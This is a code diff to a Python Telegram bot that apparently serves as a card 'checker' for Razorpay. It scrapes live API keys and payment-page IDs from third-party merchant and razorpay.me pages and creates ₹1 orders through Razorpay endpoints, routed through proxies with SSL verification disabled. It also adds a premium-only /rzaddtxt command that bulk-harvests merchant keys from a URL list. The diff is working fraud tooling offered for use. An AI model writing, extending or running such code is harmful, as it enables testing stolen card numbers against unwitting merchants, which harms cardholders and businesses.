@@ -102,14 +102,21 @@ def _random_name():
     last  = random.choice(['Sharma', 'Kumar', 'Singh', 'Patel', 'Verma', 'Gupta'])
     return first, last
 
+def _is_rzme(site):
+    return 'razorpay.me' in site
+
 # ─── RAZORPAY KEY SCRAPER ──────────────────────────────────────────────────────
 async def _scrape_rz_key(site, proxy=None):
     if site in _rz_key_cache:
         return _rz_key_cache[site]
 
     patterns = [r'(rzp_live_[A-Za-z0-9]{14,})', r'(rzp_test_[A-Za-z0-9]{14,})']
-    urls     = [f'{site}/', f'{site}/checkout/', f'{site}/shop/', f'{site}/donate/']
     headers  = {'user-agent': UA}
+
+    if _is_rzme(site):
+        urls = [site, site + '/']
+    else:
+        urls = [f'{site}/', f'{site}/checkout/', f'{site}/shop/', f'{site}/donate/']
 
     try:
         connector = aiohttp.TCPConnector(ssl=False)
@@ -124,6 +131,10 @@ async def _scrape_rz_key(site, proxy=None):
                         m = re.search(pat, text)
                         if m:
                             _rz_key_cache[site] = m.group(1)
+                            # also cache payment_page_id for rzme sites
+                            pid = re.search(r'(ppage_[A-Za-z0-9]+)', text)
+                            if pid:
+                                _rz_key_cache[site + '__ppage'] = pid.group(1)
                             return _rz_key_cache[site]
                 except Exception:
                     continue
@@ -131,7 +142,51 @@ async def _scrape_rz_key(site, proxy=None):
         pass
     return None
 
-# ─── ORDER CREATION (WooCommerce + Razorpay) ───────────────────────────────────
+# ─── ORDER CREATION — razorpay.me payment page ────────────────────────────────
+async def _create_rzme_order(site, key, proxy):
+    headers = {
+        'user-agent':   UA,
+        'origin':       'https://razorpay.me',
+        'referer':      site,
+        'content-type': 'application/json',
+    }
+    ppage_id = _rz_key_cache.get(site + '__ppage')
+    amount   = 100  # ₹1
+
+    try:
+        connector = aiohttp.TCPConnector(ssl=False)
+        async with aiohttp.ClientSession(headers=headers, connector=connector) as s:
+            # Try payment page order endpoint
+            endpoints = []
+            if ppage_id:
+                endpoints.append(
+                    (f'https://api.razorpay.com/v1/payment_pages/{ppage_id}/payment',
+                     {'amount': amount, 'currency': 'INR'})
+                )
+            # Generic checkout embedded endpoint
+            handle = site.rstrip('/').split('/@')[-1] if '/@' in site else ''
+            if handle:
+                endpoints.append(
+                    (f'https://api.razorpay.com/v1/checkout/embedded',
+                     {'key': key, 'amount': amount, 'currency': 'INR',
+                      'receipt': f'rcpt_{rnd(8)}'})
+                )
+
+            for url, payload in endpoints:
+                try:
+                    async with s.post(url, json=payload, proxy=proxy,
+                            timeout=aiohttp.ClientTimeout(total=15)) as r:
+                        d = await r.json(content_type=None)
+                    order_id = d.get('id') or d.get('order_id') or d.get('razorpay_order_id')
+                    if order_id and order_id.startswith('order_'):
+                        return {'order_id': order_id, 'amount': amount}
+                except Exception:
+                    continue
+    except Exception:
+        pass
+    return None
+
+# ─── ORDER CREATION — WooCommerce + Razorpay ───────────────────────────────────
 async def _create_order(s, site, proxy):
     headers = {'user-agent': UA}
 
@@ -250,7 +305,10 @@ async def razorpay_check(card: str, site: str, key: str, proxy_str=None):
         async with aiohttp.ClientSession(headers={'user-agent': UA},
                 connector=connector) as s:
 
-            order = await _create_order(s, site, proxy)
+            if _is_rzme(site):
+                order = await _create_rzme_order(site, key, proxy)
+            else:
+                order = await _create_order(s, site, proxy)
             if not order:
                 return {'status': 'Error', 'message': 'Order creation failed', 'card': card}
 
@@ -367,8 +425,9 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
             await event.reply(
                 "❌ <b>Usage:</b>\n"
                 "▸ <code>/rzadd https://yoursite.com</code>\n"
-                "▸ Reply to a <b>.txt</b> file with site URL\n\n"
-                "<i>Site must be WooCommerce + Razorpay.</i>",
+                "▸ Reply to a <b>.txt</b> file with site URL\n"
+                "▸ <code>/rzaddtxt</code> — bulk add ALL URLs from .txt\n\n"
+                "<i>Supports razorpay.me pages and WooCommerce sites.</i>",
                 parse_mode='html'
             )
             return
@@ -417,6 +476,102 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
                 f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
                 parse_mode='html'
             )
+
+    # ── /rzaddtxt ──────────────────────────────────────────────────────────────
+    @bot.on(events.NewMessage(pattern=r'^/rzaddtxt(\s|$)'))
+    async def rzaddtxt_handler(event):
+        user_id = event.sender_id
+        if not is_premium_fn(user_id):
+            await event.reply(
+                "❌ <b>Access Denied</b>\n\nOnly premium users can use this.",
+                parse_mode='html'
+            )
+            return
+
+        if not event.reply_to_msg_id:
+            await event.reply(
+                "❌ Reply to a <b>.txt</b> file containing site URLs with <code>/rzaddtxt</code>.",
+                parse_mode='html'
+            )
+            return
+
+        reply_msg = await event.get_reply_message()
+        if not reply_msg or not reply_msg.file or \
+                not (reply_msg.file.name or '').endswith('.txt'):
+            await event.reply("❌ Please reply to a <b>.txt</b> file.", parse_mode='html')
+            return
+
+        wait = await event.reply(
+            "◈  <b>𝗦𝗖𝗔𝗡𝗡𝗜𝗡𝗚</b>  <code>[ ░░░░░░░░░░ ]</code>\n"
+            "<i>Reading file and checking sites...</i>",
+            parse_mode='html'
+        )
+
+        file_path = await reply_msg.download_media()
+        try:
+            async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                content = await f.read()
+            os.remove(file_path)
+        except Exception:
+            await wait.edit("❌ Could not read file.", parse_mode='html')
+            return
+
+        all_urls = re.findall(r'https?://\S+', content)
+        all_urls = list(dict.fromkeys([u.rstrip('/') for u in all_urls]))  # deduplicate
+
+        if not all_urls:
+            await wait.edit(
+                "❌ No URLs found in file.\n<i>Each line should be a full URL (https://...)</i>",
+                parse_mode='html'
+            )
+            return
+
+        proxies = load_proxies_fn(user_id)
+        added   = []
+        skipped = []
+        no_key  = []
+
+        for url in all_urls:
+            url = _normalize_url(url)
+            sites_now = _get_user_rz_sites(user_id)
+            if len(sites_now) >= MAX_SITES:
+                skipped.append(url)
+                continue
+            if url in sites_now:
+                skipped.append(url)
+                continue
+            proxy = random.choice(proxies) if proxies else None
+            key   = await _scrape_rz_key(url, proxy)
+            if key:
+                _add_user_rz_site(user_id, url)
+                added.append((url, key))
+            else:
+                no_key.append(url)
+
+        total_now = len(_get_user_rz_sites(user_id))
+        added_lines = ''
+        for u, k in added[:10]:
+            masked = k[:14] + '...' + k[-4:]
+            added_lines += f"✅ <code>{u}</code>\n    🔑 <i>{masked}</i>\n"
+        if not added_lines:
+            added_lines = '<i>None added</i>'
+
+        skip_txt = f"\n⚠️ <b>Skipped</b>  ▸  {len(skipped)} (already added or limit reached)" if skipped else ''
+        nokey_txt = f"\n❌ <b>No key</b>  ▸  {len(no_key)} sites" if no_key else ''
+
+        await wait.edit(
+            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
+            f"✅  <b>𝗕𝗨𝗟𝗞  𝗔𝗗𝗗  𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘</b>  ✅\n"
+            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
+            f"📋 <b>𝗙𝗢𝗨𝗡𝗗</b>   ▸  {len(all_urls)} URLs in file\n"
+            f"✅ <b>𝗔𝗗𝗗𝗘𝗗</b>   ▸  {len(added)}\n"
+            f"📊 <b>𝗧𝗢𝗧𝗔𝗟</b>   ▸  {total_now} / {MAX_SITES} sites\n"
+            f"{skip_txt}{nokey_txt}\n\n"
+            f"〔 ✅  A D D E D  S I T E S 〕\n"
+            f"<blockquote>{added_lines}</blockquote>\n\n"
+            f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
+            parse_mode='html'
+        )
 
     # ── /rzlist ────────────────────────────────────────────────────────────────
     @bot.on(events.NewMessage(pattern=r'^/rzlist(\s|$)'))
